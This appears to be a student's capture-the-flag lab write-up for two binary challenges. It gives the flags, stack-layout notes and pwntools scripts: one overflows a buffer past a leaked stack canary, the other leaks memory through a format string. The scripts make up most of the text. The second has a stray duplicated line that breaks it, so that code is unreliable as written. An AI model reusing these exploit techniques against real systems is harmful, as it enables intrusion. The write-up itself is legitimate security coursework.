| Name   | Zid       |
|--------|-----------|
| Li Li  | z5441928  |


# Exploitation:

## Question 1 - kawasaki:

FLAG: 

FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNi1rYXdhc2FraSIsImlwIjoiMTcwLjY0LjIwNy43OCIsInNlc3Npb24iOiI3OGRjMWQwMC0zYzgzLTQ0ODItYWZjZi0xZGM2OTkyM2QwNzYifQ.yU2GYR-EFn-vIH4bURPTx-S-buzik3KJU0nkW28w25o}

Writeup:

* buffer : rbp-0x40
* canary : rbp - 0x11
* padding_before: 0x40-0x11 = 47
* padding_after: 1
* padding_rbp = 8
* payload = b"A"* 47 + p64(hex_number) + b"A" * 9 + b"A" *8 + p64(rdn_addr))
* 


script

```
import re
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('6447.lol', 6002)
elif args.HOST:
    p = process('./kawasaki')
else:
    context.terminal =['tmux', 'splitw', '-h', '-p', '75']
    p = gdb.debug('./kawasaki',
                  gdbscript='''
                  b *vuln+233
                  c
                  ''')

p.recvuntil(b'function @').decode('utf-8').strip()
rdn_addr_str = p.recvline().strip(b'\n')
print('rdn_addr_str', rdn_addr_str)
rdn_addr = int(rdn_addr_str, 16)

p.recvuntil(b'canary').decode('utf-8').strip()
text = p.recvline().strip(b'\n')

# Use a bytes pattern in re search
hex_value = re.search(b'0x[0-9a-fA-F]+', text)

# Check if a match is found and convert to integer
if hex_value:
    hex_number = int(hex_value.group(), 16)
    print(hex_value.group(), text)
else:
    print("No hex value found")

p.sendline(b"A"* 47 + p64(hex_number) + b"A" * 9 + b"A" *8 + p64(rdn_addr))

p.interactive()

```


## Question 2 - halloween:

FLAG: 

FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNi1oYWxsb3dlZW4iLCJpcCI6IjE3MC42NC4yMDcuNzgiLCJzZXNzaW9uIjoiNDhkM2QxZTgtZmMzZS00MmJkLWE3ZDUtNTE0MDA5OTM2MTBkIn0.qge3R9Nu0KCMnlZCfOBGs17jbf2XfOF778BnJxNQzLY}

Writeup:

* buffer : rbp-0x100
* format string start with rbp-0x80
* offset = 0x80/8 = 16 + 7th = 23th
* payload : padding + b"%23$s..." + p64(hex_number)

script

```
import re
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('6447.lol', 6001)
elif args.HOST:
    p = process('./halloween')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '75']
    p = gdb.debug('./halloween',
                  gdbscript='''
                  b *main+144
                  c
                  ''')

p.recvuntil(b'variable @').decode('utf-8').strip()
text = p.recvline().strip(b'\n')

# Use a bytes pattern in re search
hex_value = re.search(b'0x[0-9a-fA-F]+', text)

# Check if a match is found and convert to integer
if hex_value:
    hex_number = int(hex_value.group(), 16)
    print(hex_value.group(), text)
else:
    print("No hex value found")

padding = cyclic((0x100 - 0x80), alphabet=string.ascii_uppercase, n=8).encode()

# p.sendline(padding + b"%p......" * 16)

p.sendline(padding + b"%23$s..." + p64(hex_number))
p64(hex_number))
p.interactive()


```



